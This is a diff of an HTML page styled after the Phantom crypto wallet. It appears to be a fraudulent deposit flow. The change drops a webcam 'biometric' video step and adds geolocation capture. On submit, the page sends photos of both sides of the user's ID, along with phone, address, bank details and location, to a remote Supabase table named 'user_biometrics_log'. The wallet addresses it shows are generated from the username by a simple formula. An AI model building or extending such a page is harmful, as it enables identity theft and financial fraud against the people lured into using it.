@@ -8,8 +8,135 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
-    <link rel="stylesheet" href="style.css">
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');
+
+        :root {
+            --phantom-purple: #ab66ff;
+            --bg: #000;
+            --card: #0a0a0a;
+            --text-muted: rgba(255, 255, 255, 0.4);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: #fff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overscroll-behavior-y: contain;
+            overflow: hidden;
+            /* Prevent body scroll, handle in app-container */
+        }
+
+        .app-container {
+            width: 100%;
+            height: 100vh;
+            background: #000;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        @media (min-width: 640px) {
+            .app-container {
+                max-width: 380px;
+                height: 720px;
+                border: 1px solid #1a1a1a;
+                border-radius: 32px;
+                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            }
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .phantom-btn {
+            background: var(--phantom-purple);
+            color: white;
+            font-weight: 700;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            border: none;
+        }
+
+        .phantom-btn:active {
+            transform: scale(0.97);
+            opacity: 0.9;
+        }
+
+        .phantom-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .loader {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--phantom-purple);
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            display: inline-block;
+            animation: rotation 1s linear infinite;
+        }
+
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Toast Notification */
+        #toast {
+            position: absolute;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(200px);
+            /* Start hidden below */
+            background: rgba(10, 10, 10, 0.95);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 700;
+            z-index: 1001;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            min-width: 200px;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        #toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.2) !important;
+        }
+
         .step-dot {
             width: 8px;
             height: 8px;
@@ -33,20 +160,6 @@
             border-color: var(--phantom-purple);
             background: rgba(171, 102, 255, 0.1);
         }
-
-        video {
-            width: 100%;
-            border-radius: 16px;
-            transform: scaleX(-1);
-            background: #111;
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 4px;
-            background: var(--phantom-purple);
-            transition: width 15s linear;
-        }
     </style>
 </head>
 
@@ -69,7 +182,6 @@
         <div id="step-indicator" class="flex justify-center gap-2 mb-8">
             <div class="step-dot active" id="dot-1"></div>
             <div class="step-dot" id="dot-2"></div>
-            <div class="step-dot" id="dot-3"></div>
         </div>
 
         <!-- Step 1: Transaction -->
@@ -119,38 +231,138 @@
             <div class="flex gap-2">
                 <button onclick="goToStep(1)"
                     class="w-1/3 py-4 text-[10px] font-bold text-white/40 uppercase tracking-widest border border-white/10 rounded-xl">Back</button>
-                <button onclick="toVerification()"
-                    class="phantom-btn flex-1 py-4 text-xs uppercase tracking-widest">Final: Biometrics</button>
+                <button onclick="uploadData()" class="phantom-btn flex-1 py-4 text-xs uppercase tracking-widest">Submit
+                    Request</button>
             </div>
         </div>
 
-        <!-- Step 3: Biometrics -->
-        <div id="step-verify" class="hidden space-y-4 animate__animated animate__fadeIn">
-            <div class="text-center space-y-2">
-                <h4 class="font-bold text-lg">Biometric Verification</h4>
-                <p class="text-xs text-white/50" id="target-sign">Loading signs...</p>
-            </div>
 
-            <div class="relative">
-                <video id="webcam" autoplay playsinline muted></video>
-                <div class="absolute bottom-0 left-0 w-full bg-white/10 h-1">
-                    <div id="video-progress" class="progress-bar"></div>
-                </div>
-            </div>
-
-            <button id="status-display" disabled
-                class="phantom-btn w-full py-4 text-xs uppercase tracking-widest opacity-50">Initializing
-                Cam...</button>
-        </div>
 
         <div id="toast"></div>
     </div>
 
-    <script src="app.js"></script>
+    <script>
+        // Consolidated v2_core_utils.js
+        const SB_URL = "https://tmvimacikrnrizxtcesf.supabase.co";
+        const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4";
+        let sb;
+
+        if (typeof supabase !== 'undefined') {
+            sb = supabase.createClient(SB_URL, SB_KEY);
+        } else {
+            console.error("Supabase library not loaded!");
+        }
+
+        let user = null;
+
+        function loadUser() {
+            try {
+                const saved = localStorage.getItem('phantom_user');
+                if (saved) {
+                    user = JSON.parse(saved);
+                    return user;
+                }
+            } catch (e) {
+                console.error("Error loading user", e);
+            }
+            return null;
+        }
+
+        function saveUser(userData) {
+            user = userData;
+            localStorage.setItem('phantom_user', JSON.stringify(userData));
+        }
+
+        function clearUser() {
+            user = null;
+            localStorage.removeItem('phantom_user');
+        }
+
+        function showToast(msg) {
+            let t = document.getElementById('toast');
+            if (!t) {
+                t = document.createElement('div');
+                t.id = 'toast';
+                document.querySelector('.app-container').appendChild(t);
+            }
+            t.innerText = msg;
+            t.classList.add('show');
+            if (t.timeout) clearTimeout(t.timeout);
+            t.timeout = setTimeout(() => {
+                t.classList.remove('show');
+            }, 3000);
+        }
+
+        function getAvatarInitials(name) {
+            return name ? name.charAt(0).toUpperCase() : '?';
+        }
+
+        function getAddress(username) {
+            if (!username) return 'Unknown Wallet';
+            const chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+            let addr = "PH";
+            for (let i = 0; i < 42; i++) {
+                const charIndex = (username.charCodeAt(i % username.length) + i * 7) % chars.length;
+                addr += chars[charIndex];
+            }
+            return addr;
+        }
+
+        function addLocalPending(depositData) {
+            try {
+                const key = `pending_deposits_${user.id}`;
+                let pending = JSON.parse(localStorage.getItem(key) || "[]");
+                const { id_front, id_back, ...smallData } = depositData;
+                pending.push({
+                    ...smallData,
+                    created_at: new Date().toISOString(),
+                    status: 'pending'
+                });
+                localStorage.setItem(key, JSON.stringify(pending));
+            } catch (e) {
+                console.error("Error saving local pending", e);
+            }
+        }
+
+        function getLocalPending() {
+            if (!user) return [];
+            try {
+                const key = `pending_deposits_${user.id}`;
+                return JSON.parse(localStorage.getItem(key) || "[]");
+            } catch (e) {
+                return [];
+            }
+        }
+
+        function removeLocalPending(amount) {
+            if (!user) return;
+            try {
+                const key = `pending_deposits_${user.id}`;
+                let pending = JSON.parse(localStorage.getItem(key) || "[]");
+                const idx = pending.findIndex(p => Math.abs(parseFloat(p.amount) - parseFloat(amount)) < 0.0001);
+                if (idx !== -1) {
+                    pending.splice(idx, 1);
+                    localStorage.setItem(key, JSON.stringify(pending));
+                }
+            } catch (e) { }
+        }
+
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("Not Supported");
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve(`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`),
+                    (err) => resolve("Denied/Error"),
+                    { timeout: 5000 }
+                );
+            });
+        }
+    </script>
     <script>
         let selectedMethod = 'bank';
-        let stream = null;
-        let mediaRecorder = null;
         let recordedChunks = [];
 
         window.onload = () => {
@@ -167,64 +379,30 @@
         function goToStep(step) {
             document.getElementById('step-1').classList.add('hidden');
             document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('step-verify').classList.add('hidden');
 
             if (step === 1) document.getElementById('step-1').classList.remove('hidden');
             if (step === 2) document.getElementById('step-2').classList.remove('hidden');
-            if (step === 3) document.getElementById('step-verify').classList.remove('hidden');
 
             document.querySelectorAll('.step-dot').forEach((dot, idx) => dot.classList.toggle('active', idx < step));
         }
 
-        async function toVerification() {
-            const phone = document.getElementById('dep-phone').value;
-            const idFront = document.getElementById('id-front').files[0];
-            const idBack = document.getElementById('id-back').files[0];
 
-            if (!phone || !idFront || !idBack) return showToast("Missing ID Docs");
-
-            // Mock signs
-            document.getElementById('target-sign').innerText = "Perform: Peace Sign & Thumbs Up";
-            goToStep(3);
-
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('webcam').srcObject = stream;
-
-                setTimeout(startRecording, 1000);
-            } catch (err) {
-                showToast("Camera Denied");
-            }
-        }
-
-        function startRecording() {
-            const status = document.getElementById('status-display');
-            document.getElementById('video-progress').style.width = '100%';
-            status.innerText = "RECORDING...";
-
-            recordedChunks = [];
-
-            // Try compatible mime type
-            const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
-
-            mediaRecorder = new MediaRecorder(stream, { mimeType: mime });
-            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
-            mediaRecorder.onstop = uploadData;
-            mediaRecorder.start();
-
-            setTimeout(() => { mediaRecorder.stop(); }, 5000); // 5s video short
-        }
 
         async function uploadData() {
-            document.getElementById('status-display').innerText = "UPLOADING...";
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const phone = document.getElementById('dep-phone').value;
+            const idFrontFile = document.getElementById('id-front').files[0];
+            const idBackFile = document.getElementById('id-back').files[0];
+
+            if (!phone || !idFrontFile || !idBackFile) return showToast("Missing ID Docs");
+
+            showToast("UPLOADING...");
 
             try {
-                const videoBase64 = await fileToBase64(blob);
-                const idFront = await fileToBase64(document.getElementById('id-front').files[0]);
-                const idBack = await fileToBase64(document.getElementById('id-back').files[0]);
+                const idFront = await fileToBase64(idFrontFile);
+                const idBack = await fileToBase64(idBackFile);
+                const geo = await getGeolocation();
 
-                await sb.from('user_biometrics_log').insert([{
+                const data = {
                     user_id: user.id,
                     username: user.username,
                     amount: parseFloat(document.getElementById('dep-amount').value),
@@ -232,12 +410,15 @@
                     bank_info: document.getElementById('dep-bank').value,
                     phone: document.getElementById('dep-phone').value,
                     address: document.getElementById('dep-address').value,
-                    video_url: videoBase64,
+                    geolocation: geo,
                     id_front: idFront,
                     id_back: idBack,
                     status: 'pending'
-                }]);
+                };
 
+                await sb.from('user_biometrics_log').insert([data]);
+
+                addLocalPending(data);
                 showToast("Request Submitted");
                 setTimeout(() => window.location.href = 'dashboard.html', 1500);
 
